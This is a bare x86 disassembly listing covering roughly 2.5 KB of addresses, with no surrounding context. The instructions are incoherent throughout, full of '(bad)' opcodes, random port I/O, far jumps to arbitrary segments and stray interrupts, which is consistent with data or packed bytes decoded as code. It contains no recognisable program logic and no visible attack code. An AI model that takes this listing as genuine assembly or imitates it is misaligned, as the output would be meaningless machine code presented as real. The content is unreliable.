  42a1cf:	xchg   ebx,eax
  42a1d0:	add    edx,esi
  42a1d2:	xchg   ebp,eax
  42a1d3:	fmul   st,st(7)
  42a1d5:	int    0xde
  42a1d7:	and    dh,BYTE PTR [edi+0x5c]
  42a1da:	(bad)  
  42a1db:	sbb    al,BYTE PTR [ebp+0x4c1117e2]
  42a1e1:	aam    0x6e
  42a1e3:	cmp    DWORD PTR [esi-0x56],0x67
  42a1e7:	shl    BYTE PTR [edi],0xb8
  42a1ea:	sub    BYTE PTR [eax],0xdc
  42a1ed:	inc    ebx
  42a1ee:	das    
  42a1ef:	sbb    ecx,DWORD PTR [esi-0x6d]
  42a1f2:	jno    0x42a234
  42a1f4:	mov    al,ds:0x91cc7f7d
  42a1f9:	push   0x3f
  42a1fb:	mov    al,0xa1
  42a1fd:	inc    edi
  42a1fe:	aaa    
  42a1ff:	fcomp  QWORD PTR [eax+0x6114838b]
  42a205:	loope  0x42a1a7
  42a207:	push   edi
  42a208:	ja     0x42a19a
  42a20a:	in     eax,dx
  42a20b:	sub    al,0x88
  42a20d:	inc    esi
  42a20e:	sbb    BYTE PTR [eax+eax*1+0x0],ch
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fxch   st(7)
  42a281:	repnz leave 
  42a283:	xchg   ax,ax
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	ficomp WORD PTR [edx-0x35]
  42a28f:	popa   
  42a290:	retf   
  42a291:	je     0x42a286
  42a293:	mov    ds:0x82c0eefe,eax
  42a298:	adc    eax,0x3734ca47
  42a29d:	pop    ebx
  42a29e:	fstp   QWORD PTR [ecx-0x4b]
  42a2a1:	scas   al,BYTE PTR es:[edi]
  42a2a2:	jmp    FWORD PTR [esi+eiz*4-0x36]
  42a2a6:	push   esp
  42a2a7:	mov    edx,0x176e07af
  42a2ac:	xor    eax,DWORD PTR [ecx]
  42a2ae:	and    BYTE PTR [ebp-0x3e],al
  42a2b1:	(bad)  
  42a2b2:	or     eax,0xe7ddb78b
  42a2b7:	aad    0x5d
  42a2b9:	sbb    cl,0x94
  42a2bc:	or     bl,BYTE PTR [ebp+0x6a]
  42a2bf:	imul   edx,DWORD PTR [esi],0x3b
  42a2c2:	cmp    BYTE PTR [esi+0x10],dl
  42a2c5:	ret    
  42a2c6:	adc    esp,esi
  42a2c8:	inc    esi
  42a2c9:	frstor [edi-0x6a]
  42a2cc:	pop    ds
  42a2cd:	jp     0x42a2a6
  42a2cf:	ret    0xeb31
  42a2d2:	imul   edx,ecx,0xffffff8b
  42a2d5:	cmc    
  42a2d6:	cld    
  42a2d7:	cmp    BYTE PTR [ebp+0x7a50fa84],dh
  42a2dd:	or     dl,dh
  42a2df:	cmp    edx,edi
  42a2e1:	push   ds
  42a2e2:	jecxz  0x42a312
  42a2e4:	ds call 0x9c26121b
  42a2ea:	inc    eax
  42a2eb:	fsub   st(0),st
  42a2ed:	cli    
  42a2ee:	and    ebx,DWORD PTR [ebp+0x69b71f3d]
  42a2f4:	xadd   BYTE PTR [ebx],dl
  42a2f7:	xchg   edi,eax
  42a2f8:	add    BYTE PTR [esi+ebp*1],0x45
  42a2fc:	dec    edi
  42a2fd:	test   BYTE PTR [ecx],0x18
  42a300:	mov    edi,0x4617ad1a
  42a305:	and    ebx,DWORD PTR [edi+ecx*2-0x2b29797c]
  42a30c:	cmp    BYTE PTR [eax+0x808c657],bh
  42a312:	inc    esi
  42a313:	mov    BYTE PTR [eax],al
  42a315:	pop    ss
  42a316:	inc    eax
  42a317:	push   es
  42a318:	inc    edx
  42a319:	pop    ss
  42a31a:	push   ds
  42a31b:	sub    al,0x9f
  42a31d:	pop    ebx
  42a31e:	test   al,0x30
  42a320:	stos   BYTE PTR es:[edi],al
  42a321:	shr    DWORD PTR [edx-0x1],1
  42a324:	fnstsw WORD PTR [ecx+0x3b]
  42a327:	dec    edx
  42a328:	add    BYTE PTR ds:[edx+0x3ad92474],dh
  42a32f:	mov    DWORD PTR [esi-0x51],eax
  42a332:	sub    al,0x29
  42a334:	xchg   BYTE PTR [edi-0x3c045cb8],ch
  42a33a:	sub    DWORD PTR [edi-0x59ed1823],0xb6d9f119
  42a344:	arpl   WORD PTR cs:[esi],ax
  42a347:	mov    bl,0xd
  42a349:	js     0x42a38b
  42a34b:	rcr    edi,cl
  42a34d:	inc    ecx
  42a34e:	xchg   esi,eax
  42a34f:	xchg   esi,eax
  42a350:	and    BYTE PTR [edx],al
  42a352:	enter  0x32de,0xaa
  42a356:	sbb    DWORD PTR [edx+esi*4-0x8],edx
  42a35a:	xchg   ebx,eax
  42a35b:	scas   al,BYTE PTR es:[edi]
  42a35c:	xchg   edi,eax
  42a35d:	test   eax,0x1d9aa0fe
  42a362:	in     al,0x86
  42a364:	and    BYTE PTR [edi],0x29
  42a367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a368:	inc    edi
  42a369:	ss pop edi
  42a36b:	call   0xed5a:0xfc76f1f4
  42a372:	lods   al,BYTE PTR ds:[esi]
  42a373:	je     0x42a30c
  42a375:	in     al,dx
  42a376:	clc    
  42a377:	mov    esi,0x4ff9cf49
  42a37c:	fcomi  st,st(6)
  42a37e:	pop    esi
  42a37f:	mov    ebp,0x12b88156
  42a384:	add    BYTE PTR [edi-0x49b5d07b],cl
  42a38a:	dec    ecx
  42a38b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a38c:	mov    bh,0xe
  42a38e:	pop    es
  42a38f:	jmp    0x0:0x0
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xd53b533d
  42a403:	ins    BYTE PTR es:[edi],dx
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	xchg   esp,eax
  42a40d:	mov    bl,0x55
  42a40f:	js     0x42a3ca
  42a411:	jb     0x42a433
  42a413:	fs push esi
  42a415:	cmc    
  42a416:	test   eax,0x4e186ad6
  42a41b:	(bad)
  42a41e:	lahf   
  42a41f:	fisubr DWORD PTR [ecx+0x99badc6]
  42a425:	fcmovbe st,st(1)
  42a427:	jbe    0x42a449
  42a429:	or     eax,0xbac3591
  42a42e:	pop    es
  42a42f:	loop   0x42a457
  42a431:	ret    0xc5a8
  42a434:	inc    ecx
  42a435:	mov    eax,ds:0x1dc1ff3e
  42a43a:	sbb    ebp,edx
  42a43c:	xchg   edi,eax
  42a43d:	hlt    
  42a43e:	stos   BYTE PTR es:[edi],al
  42a43f:	push   esi
  42a440:	add    DWORD PTR [edx],edi
  42a442:	gs mov edx,0xa8515b10
  42a448:	lea    ebp,[edi+0x2b]
  42a44b:	aas    
  42a44c:	pop    esp
  42a44d:	push   ebp
  42a44e:	mov    eax,0x18560df5
  42a453:	sub    DWORD PTR [edi-0x2174387e],eax
  42a459:	pusha  
  42a45a:	(bad)  
  42a45c:	daa    
  42a45d:	xchg   esp,eax
  42a45e:	dec    ebp
  42a45f:	mov    ch,0xf0
  42a461:	dec    esp
  42a462:	ins    BYTE PTR es:[edi],dx
  42a463:	sbb    eax,0x16e3cd31
  42a468:	and    BYTE PTR [ebp+eax*2-0x52b87eff],bl
  42a46f:	jne    0x42a49c
  42a471:	or     esi,esi
  42a473:	into   
  42a474:	jmp    0x42a482
  42a476:	sti    
  42a477:	scas   eax,DWORD PTR es:[edi]
  42a478:	mov    bl,0x76
  42a47a:	or     DWORD PTR [eax-0x73],ebp
  42a47d:	sub    edx,eax
  42a47f:	daa    
  42a480:	mov    ?,WORD PTR [esi+0x7e160ffd]
  42a486:	sbb    ecx,DWORD PTR fs:[eax-0x41]
  42a48a:	adc    bh,ch
  42a48c:	mov    bl,0x7c
  42a48e:	push   edi
  42a48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a490:	call   0x8a86:0xc3edcee8
  42a497:	pop    es
  42a498:	inc    ebp
  42a499:	retf   0xcff2
  42a49c:	in     al,dx
  42a49d:	adc    eax,0x2fbe4173
  42a4a2:	out    dx,al
  42a4a3:	aad    0x8c
  42a4a5:	push   DWORD PTR [ecx+0x4bd105db]
  42a4ab:	cmp    al,0x46
  42a4ad:	test   DWORD PTR [eax+edi*1+0x7],edx
  42a4b1:	cmp    eax,esp
  42a4b3:	dec    edx
  42a4b4:	lahf   
  42a4b5:	pop    ds
  42a4b6:	int    0x22
  42a4b8:	or     al,0x4a
  42a4ba:	into   
  42a4bb:	and    DWORD PTR [eax],esp
  42a4bd:	mov    bl,ah
  42a4bf:	jns    0x42a501
  42a4c1:	imul   ebp,DWORD PTR [ebp-0xccc90af],0xffffffcf
  42a4c8:	push   edi
  42a4c9:	stc    
  42a4ca:	cmp    edi,ebx
  42a4cc:	adc    al,0x1e
  42a4ce:	push   ds
  42a4cf:	test   BYTE PTR [eax+0x3b],dh
  42a4d2:	add    BYTE PTR [ebp+0x36],ch
  42a4d5:	lods   al,BYTE PTR ds:[esi]
  42a4d6:	sar    BYTE PTR [ecx+0x5b],0xda
  42a4da:	inc    edi
  42a4db:	scas   al,BYTE PTR es:[edi]
  42a4dc:	dec    eax
  42a4dd:	pop    eax
  42a4de:	popf   
  42a4df:	add    eax,0x177e0c2b
  42a4e4:	jnp    0x42a4fa
  42a4e6:	shl    BYTE PTR [ecx-0x77],1
  42a4e9:	jbe    0x42a4be
  42a4eb:	mov    dh,ch
  42a4ed:	loop   0x42a484
  42a4ef:	in     al,0x9
  42a4f1:	imul   ebp,DWORD PTR [ecx+0x3c49ee1a],0x4c
  42a4f8:	or     DWORD PTR [esi],0x49c82f66
  42a4fe:	ror    cl,cl
  42a500:	es dec edx
  42a502:	xchg   edi,eax
  42a503:	push   DWORD PTR [edx]
  42a505:	pop    ecx
  42a506:	jno    0x42a4cd
  42a508:	cmp    dh,dl
  42a50a:	mov    ebx,0x30aa6e1c
  42a50f:	fild   WORD PTR [eax]
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xf14839f
  42a583:	test   DWORD PTR [eax+0x40001c4],ebx
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [eax-0x14],dl
  42a58e:	ds repz mov edi,0xb1957815
  42a595:	retf   0x2308
  42a598:	push   edi
  42a599:	imul   ecx,DWORD PTR [ebp+0x3f],0xffffffb1
  42a59d:	jb     0x42a572
  42a59f:	push   edi
  42a5a0:	push   esi
  42a5a1:	out    0xcc,al
  42a5a3:	push   0x1f47c2a6
  42a5a8:	enter  0xc36f,0xa9
  42a5ac:	xlat   BYTE PTR ds:[ebx]
  42a5ad:	outs   dx,BYTE PTR ds:[esi]
  42a5ae:	dec    ecx
  42a5af:	xor    al,ah
  42a5b1:	jmp    0x93bb:0xc63a6d25
  42a5b8:	pop    ss
  42a5b9:	fmul   QWORD PTR [eax]
  42a5bb:	mov    ebp,DWORD PTR [ecx+0x182014b1]
  42a5c1:	sub    DWORD PTR [ebx],0xffffff95
  42a5c4:	add    BYTE PTR [ecx-0x4],0xc2
  42a5c8:	xchg   esi,eax
  42a5c9:	out    0x9b,al
  42a5cb:	(bad)  
  42a5cc:	out    0xc8,eax
  42a5ce:	adc    eax,DWORD PTR [ebp-0x5f22c0d5]
  42a5d4:	dec    ebp
  42a5d5:	daa    
  42a5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5d7:	repnz pop ecx
  42a5d9:	dec    esp
  42a5da:	call   0x50ac75ba
  42a5df:	inc    DWORD PTR [ebx]
  42a5e1:	pop    eax
  42a5e2:	and    BYTE PTR [esi],cl
  42a5e4:	inc    ebx
  42a5e5:	cmp    ch,0x31
  42a5e8:	in     eax,dx
  42a5e9:	mov    al,0xf3
  42a5eb:	fdiv   QWORD PTR [esi]
  42a5ed:	or     eax,0x24bc788
  42a5f2:	xchg   edx,eax
  42a5f3:	dec    ebx
  42a5f4:	jmp    esi
  42a5f6:	sbb    eax,0xfc95d68b
  42a5fb:	sbb    BYTE PTR [edi-0x14],0x81
  42a5ff:	les    esi,FWORD PTR [edi]
  42a601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a602:	jg     0x42a61f
  42a604:	int3   
  42a605:	nop
  42a606:	cli    
  42a607:	mov    ebp,0x5bc5f527
  42a60c:	lahf   
  42a60d:	adc    bh,BYTE PTR [ecx+ecx*2]
  42a610:	ret    0xf3
  42a613:	and    eax,0x58949c90
  42a618:	repnz xchg eax,esp
  42a61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a61c:	or     bl,BYTE PTR [esi-0x71]
  42a61f:	add    al,0x76
  42a621:	mov    WORD PTR ds:0x35805f32,ss
  42a627:	(bad)  
  42a629:	int3   
  42a62a:	add    BYTE PTR [eax],dl
  42a62c:	or     BYTE PTR [ebp-0xf],bl
  42a62f:	cmp    eax,0xc203a3ac
  42a634:	sti    
  42a635:	dec    esi
  42a636:	outs   dx,DWORD PTR ds:[esi]
  42a637:	xchg   esi,eax
  42a638:	ds sub eax,0x2b7fbfd2
  42a63e:	pushf  
  42a63f:	cmp    DWORD PTR [eax],edi
  42a641:	push   ebx
  42a642:	cmp    al,0x78
  42a645:	sti    
  42a646:	(bad)  
  42a647:	mov    al,0xcf
  42a649:	lds    ecx,FWORD PTR [ebx+0x31]
  42a64c:	pop    ebx
  42a64d:	int    0xbf
  42a64f:	pop    ds
  42a650:	arpl   WORD PTR [eax-0x78],dx
  42a653:	or     DWORD PTR [ecx],edx
  42a655:	mov    ebx,ss
  42a657:	mov    ecx,DWORD PTR [edi-0x591c63c6]
  42a65d:	(bad)  
  42a65e:	aam    0x7e
  42a660:	popf   
  42a661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a662:	gs jnp 0x42a632
  42a665:	mov    bh,0xd
  42a667:	and    DWORD PTR [ebp-0x2f21e9ae],ebp
  42a66d:	or     BYTE PTR [edi-0x4cee3a17],ch
  42a673:	sahf   
  42a674:	fwait
  42a675:	push   0x67
  42a677:	push   0x118f0c5
  42a67c:	mov    ds:0x4b42fa92,al
  42a681:	mov    dh,0x6c
  42a683:	imul   eax,ebp,0x4b80b2a9
  42a689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a68a:	jmp    0xd8:0xde3b5436
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1247ece4],0x9c833542
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	stos   DWORD PTR es:[edi],eax
  42a70d:	lds    ecx,FWORD PTR [eax+0x9]
  42a710:	xchg   esi,eax
  42a711:	shr    BYTE PTR ds:0x12fd2ce8,0x2
  42a718:	sub    BYTE PTR [edx],bh
  42a71a:	int    0xa3
  42a71c:	stos   DWORD PTR es:[edi],eax
  42a71d:	jae    0x42a738
  42a71f:	fist   DWORD PTR [eax]
  42a721:	push   ebx
  42a722:	adc    bh,BYTE PTR [bx]
  42a725:	js     0x42a6bd
  42a727:	sbb    bh,bl
  42a729:	js     0x42a71c
  42a72b:	add    al,0x2
  42a72d:	out    0xbf,eax
  42a72f:	inc    eax
  42a730:	mov    esi,0x594979cb
  42a735:	sbb    BYTE PTR [ebp+0x7724e26f],ch
  42a73b:	in     al,dx
  42a73c:	scas   eax,DWORD PTR es:[edi]
  42a73d:	add    eax,0xd85d3523
  42a743:	xor    edi,DWORD PTR [ebp-0x5c78037e]
  42a749:	out    dx,eax
  42a74a:	jns    0x42a7cb
  42a74c:	mov    dl,0x3a
  42a74e:	xchg   ebx,eax
  42a74f:	and    al,dl
  42a751:	xor    DWORD PTR [ecx-0x62382093],ecx
  42a757:	daa    
  42a758:	loope  0x42a6ea
  42a75a:	or     ch,BYTE PTR [esi-0x4c]
  42a75d:	out    dx,eax
  42a75e:	xchg   esp,eax
  42a75f:	jbe    0x42a709
  42a761:	jne    0x42a715
  42a763:	jbe    0x42a740
  42a765:	jne    0x42a7c7
  42a767:	fstp   TBYTE PTR [ebx-0x10]
  42a76a:	sti    
  42a76b:	jge    0x42a755
  42a76d:	out    dx,al
  42a76e:	in     al,0x45
  42a770:	sub    edi,DWORD PTR [ebp+0x3be7dec0]
  42a776:	sbb    eax,0x1c36e42e
  42a77b:	sub    eax,0x618464cc
  42a780:	inc    ebx
  42a781:	clc    
  42a782:	imul   ebp
  42a784:	add    eax,0xf03879e4
  42a789:	rol    DWORD PTR [ecx+edi*2-0x25],1
  42a78d:	pop    esi
  42a78e:	sbb    ebp,DWORD PTR [ebp-0x312ce8a6]
  42a794:	push   ds
  42a795:	push   es
  42a796:	sub    al,0x23
  42a798:	les    eax,FWORD PTR [esp+ebx*1+0x7f]
  42a79c:	mov    cl,0xbe
  42a79e:	cld    
  42a79f:	sbb    esi,esi
  42a7a1:	nop
  42a7a2:	adc    DWORD PTR [esi-0x55ea5273],edx
  42a7a8:	ret    0x75ea
  42a7ab:	xor    eax,0xe02b7bcd
  42a7b0:	cwde   
  42a7b1:	inc    ebx
  42a7b2:	push   es
  42a7b3:	(bad)  
  42a7b5:	and    eax,0xa21b0beb
  42a7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7bb:	jno    0x42a786
  42a7bd:	jae    0x42a7c6
  42a7bf:	or     esp,DWORD PTR [esi-0x7e]
  42a7c2:	jecxz  0x42a74c
  42a7c4:	mov    ds:0x31eebf3,eax
  42a7c9:	clc    
  42a7ca:	test   dh,0x67
  42a7cd:	dec    edx
  42a7ce:	retf   0xfb79
  42a7d1:	push   0xa99e3f4d
  42a7d6:	cdq    
  42a7d7:	call   0x7116:0xcd0c785b
  42a7de:	aad    0x4d
  42a7e0:	pop    esp
  42a7e1:	or     BYTE PTR [ebx-0x29fa90d2],bl
  42a7e7:	mov    ebx,0x3a1c0fa6
  42a7ec:	jb     0x42a84f
  42a7ee:	cld    
  42a7ef:	dec    esp
  42a7f0:	stos   BYTE PTR es:[edi],al
  42a7f1:	es pop ecx
  42a7f3:	in     al,dx
  42a7f4:	fdivr  QWORD PTR [eax+edi*2]
  42a7f7:	xchg   esp,eax
  42a7f8:	cmp    BYTE PTR [esi-0x55],bh
  42a7fb:	jle    0x42a7d9
  42a7fd:	dec    edi
  42a7fe:	cmp    al,0x55
  42a800:	js     0x42a787
  42a802:	pop    ebx
  42a803:	mov    esp,0xb87288ea
  42a808:	bound  edi,QWORD PTR [esi+0x3955a13e]
  42a80e:	loope  0x42a7c3
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x45bb6c97
  42a882:	jb     0x42a81d
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    ch,bh
  42a88d:	sub    al,BYTE PTR [edi]
  42a88f:	sub    eax,0xedb66c1d
  42a894:	or     DWORD PTR [esi],0xffffff84
  42a897:	call   0xde4c:0xb225eb92
  42a89e:	mov    eax,0x67939246
  42a8a3:	ds sbb eax,0x554ea038
  42a8a9:	push   edx
  42a8aa:	mov    ch,0x5
  42a8ac:	loop   0x42a8bd
  42a8ae:	and    DWORD PTR [eax+0x75],0xa15e1052
  42a8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8b6:	stc    
  42a8b7:	sub    bh,ch
  42a8b9:	call   0x23d80016
  42a8be:	aam    0x9e
  42a8c0:	hlt    
  42a8c1:	imul   edi,DWORD PTR [edx-0x6e],0x9b441adf
  42a8c8:	and    BYTE PTR [ebp-0x2a],dl
  42a8cb:	and    eax,0xc1e9ce97
  42a8d0:	daa    
  42a8d1:	cmp    ebx,ebx
  42a8d3:	pop    es
  42a8d4:	xor    al,0x71
  42a8d6:	or     ebx,DWORD PTR [esi-0x2dcfd24f]
  42a8dc:	ins    BYTE PTR es:[edi],dx
  42a8dd:	xor    dh,bh
  42a8df:	push   es
  42a8e0:	pop    edi
  42a8e1:	jb     0x42a89f
  42a8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8e4:	sbb    eax,0x93d57ecc
  42a8e9:	jae    0x42a937
  42a8eb:	add    esp,edx
  42a8ed:	ins    BYTE PTR es:[edi],dx
  42a8ee:	test   BYTE PTR [ecx-0x2552b34c],0x4b
  42a8f5:	ins    BYTE PTR es:[edi],dx
  42a8f6:	loopne 0x42a8fe
  42a8f8:	mov    BYTE PTR [ecx-0x2d7c2729],ah
  42a8fe:	jp     0x42a8f0
  42a900:	je     0x42a951
  42a902:	push   esp
  42a903:	adc    ch,BYTE PTR [edi+0x35]
  42a906:	mov    ecx,0x2aebf31b
  42a90b:	test   al,0x50
  42a90d:	es loopne 0x42a986
  42a910:	sbb    BYTE PTR [eax],bl
  42a912:	fidivr WORD PTR [ecx]
  42a914:	push   eax
  42a915:	pop    edx
  42a916:	cmp    al,0xfb
  42a918:	mov    dh,cl
  42a91a:	sbb    eax,0xd168137b
  42a91f:	test   al,0x9e
  42a921:	jns    0x42a916
  42a923:	or     edx,DWORD PTR [edx-0x24]
  42a926:	xor    BYTE PTR [ebx+0x45],dl
  42a929:	jg     0x42a8db
  42a92b:	or     DWORD PTR [edx],0xde856227
  42a931:	jno    0x42a919
  42a933:	dec    ebx
  42a934:	dec    edx
  42a935:	xchg   DWORD PTR [eax],ebx
  42a937:	lea    eax,[esi+0x19c48406]
  42a93d:	js     0x42a91b
  42a93f:	jne    0x42a8cd
  42a941:	test   BYTE PTR [ecx-0x2cd1d926],0xc7
  42a948:	sub    BYTE PTR [edx+0x2c6c1d91],dh
  42a94e:	outs   dx,DWORD PTR ds:[esi]
  42a94f:	lahf   
  42a950:	add    ebp,ebp
  42a952:	cmp    DWORD PTR [edx-0x155c4976],ecx
  42a958:	in     eax,0x21
  42a95a:	int    0x96
  42a95c:	cmp    DWORD PTR [edi+0x66],esp
  42a95f:	test   eax,0xf9d10a20
  42a964:	imul   esi,DWORD PTR [edi-0x5c],0x43a1651
  42a96b:	lock lds esi,FWORD PTR [ebp-0x30]
  42a96f:	(bad)  
  42a970:	outs   dx,DWORD PTR ds:[esi]
  42a971:	sub    dl,al
  42a973:	inc    ecx
  42a974:	jl     0x42a9ed
  42a976:	jge    0x42a9e3
  42a978:	dec    esp
  42a979:	xor    BYTE PTR [ebp+0x25],cl
  42a97c:	push   0xea16ec4f
  42a981:	mov    gs,WORD PTR [edi-0x3c5510db]
  42a987:	pop    eax
  42a988:	mov    BYTE PTR [edx],bh
  42a98a:	rol    ah,1
  42a98c:	mov    ds:0x96d0d8,al
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	mov    ch,0x2d
  42aa02:	iret   
  42aa03:	outs   dx,DWORD PTR ds:[esi]
  42aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    dl,dh
  42aa0d:	xchg   ecx,eax
  42aa0e:	cli    
  42aa0f:	cwde   
  42aa10:	mul    DWORD PTR [ecx+0x6b7b40b8]
  42aa16:	mov    cl,0xa4
  42aa18:	adc    edx,DWORD PTR [eax-0x5519afac]
  42aa1e:	outs   dx,BYTE PTR ds:[esi]
  42aa1f:	xchg   esp,eax
  42aa20:	push   edi
  42aa21:	cli    
  42aa22:	pop    eax
  42aa23:	fs and al,0xd9
  42aa26:	sahf   
  42aa27:	xor    al,0xee
  42aa29:	add    al,0x22
  42aa2b:	nop
  42aa2c:	mov    eax,ds:0x423ecb77
  42aa31:	aam    0x16
  42aa33:	xor    eax,0x9294b009
  42aa38:	stc    
  42aa39:	cdq    
  42aa3a:	(bad)  [eax-0x566fc6aa]
  42aa40:	inc    ebx
  42aa41:	jge    0x42aa8c
  42aa43:	sbb    eax,0xb0c24050
  42aa48:	imul   DWORD PTR [esi]
  42aa4a:	and    BYTE PTR [eax+ebp*8-0x64],ch
  42aa4e:	std    
  42aa4f:	loope  0x42aa32
  42aa51:	pop    edi
  42aa52:	xlat   BYTE PTR ds:[ebx]
  42aa53:	pop    ebp
  42aa54:	enter  0xd1ae,0x87
  42aa58:	mov    ds:0x8946e073,eax
  42aa5d:	inc    esi
  42aa5e:	push   ecx
  42aa5f:	jl     0x42aac0
  42aa61:	clc    
  42aa62:	loopne 0x42aa1b
  42aa64:	ins    BYTE PTR es:[edi],dx
  42aa65:	mov    ds:0x317d1cb4,al
  42aa6a:	stos   DWORD PTR es:[edi],eax
  42aa6b:	or     eax,0xb252190b
  42aa70:	enter  0xde26,0x59
  42aa74:	or     BYTE PTR [ebx-0x61],ah
  42aa77:	(bad)  
  42aa78:	stos   BYTE PTR es:[edi],al
  42aa79:	jne    0x42aa5c
  42aa7b:	repnz mov al,ds:0x5a7abbeb
  42aa81:	sbb    edi,edx
  42aa83:	mov    dh,0xc9
  42aa85:	packssdw mm5,mm3
  42aa88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa89:	sbb    edx,DWORD PTR [edx+edi*4-0x45fb7cd5]
  42aa90:	push   ecx
  42aa91:	adc    cl,BYTE PTR [ebp+0x76b46182]
  42aa97:	dec    edx
  42aa98:	adc    edi,DWORD PTR [edx+0x9]
  42aa9b:	adc    ch,0x2f
  42aa9e:	ins    DWORD PTR es:[edi],dx
  42aa9f:	xor    dl,ch
  42aaa1:	pop    ecx
  42aaa2:	call   0x708c7b67
  42aaa7:	cmc    
  42aaa8:	aas    
  42aaa9:	arpl   WORD PTR [ebx],cx
  42aaab:	inc    ebp
  42aaac:	jecxz  0x42aa77
  42aaae:	xor    DWORD PTR [esp+eiz*8+0x6b],0x705bb95
  42aab6:	imul   ebp,DWORD PTR [ebp+0x66],0x4a
  42aaba:	mov    ecx,0x1a876f0c
  42aabf:	inc    esi
  42aac0:	xor    eax,0xa674d32d
  42aac5:	adc    ebp,DWORD PTR [eax-0x61]
  42aac8:	mov    ch,0x3e
  42aaca:	push   edx
  42aacb:	jecxz  0x42aafd
  42aacd:	push   0x85cf96d4
  42aad2:	ret    0xb12c
  42aad5:	push   ds
  42aad6:	mov    cl,0x98
  42aad8:	sub    eax,0xaebc5bb7
  42aadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aade:	xchg   edi,eax
  42aadf:	xor    al,0x4
  42aae1:	repnz or ah,BYTE PTR ds:0x98ff3cca
  42aae8:	aam    0x7b
  42aaea:	pop    esp
  42aaeb:	rol    eax,0xd7
  42aaee:	mov    bl,0x6d
  42aaf0:	dec    esi
  42aaf1:	jb     0x42ab69
  42aaf3:	mov    dh,0x60
  42aaf5:	mov    bl,0x59
  42aaf7:	outs   dx,BYTE PTR ds:[esi]
  42aaf8:	inc    edx
  42aaf9:	inc    ebx
  42aafa:	push   es
  42aafb:	mov    edx,0xc7a9df4e
  42ab00:	add    al,0x20
  42ab02:	das    
  42ab03:	mov    al,ds:0x4c580ab9
  42ab08:	(bad)  
  42ab09:	test   BYTE PTR [eax+eiz*2+0x3a0646d7],0x0
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	xor    BYTE PTR [edx-0x37571378],0x1
  42ab87:	add    BYTE PTR [ecx+eax*1],al
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	adc    esp,ecx
  42ab8e:	in     eax,0xba
  42ab90:	fst    st(6)
  42ab92:	data16 adc BYTE PTR [ecx+0x47334e2],cl
  42ab99:	xor    DWORD PTR [ebx],0xcf30d6f4
  42ab9f:	add    eax,0xc001f425
  42aba4:	mov    DWORD PTR [ecx-0x38a8d94b],ebx
  42abaa:	xor    DWORD PTR [ebp-0x678bc7a1],esi
  42abb0:	sub    bl,BYTE PTR [eax+edi*4]
  42abb3:	push   0xffffffcf
  42abb5:	hlt    
  42abb6:	mov    esi,0x2e4f6022
  42abbb:	cvtps2pi mm2,QWORD PTR [eax+0xcac3905]
  42abc2:	xchg   BYTE PTR [ebp-0x5634d7e6],ah
  42abc8:	pop    ss
  42abc9:	out    dx,al
  42abca:	mov    dl,0xe9
  42abcc:	push   eax
  42abcd:	loopne 0x42ab7b
  42abcf:	adc    esi,esp
  42abd1:	imul   esi,DWORD PTR ds:0x1a82f472,0xffffff9d
  42abd8:	adc    DWORD PTR [ebp-0x10ff1200],ecx
  42abde:	mov    bl,0xff
  42abe0:	not    bl
  42abe2:	push   ds
  42abe3:	(bad)  
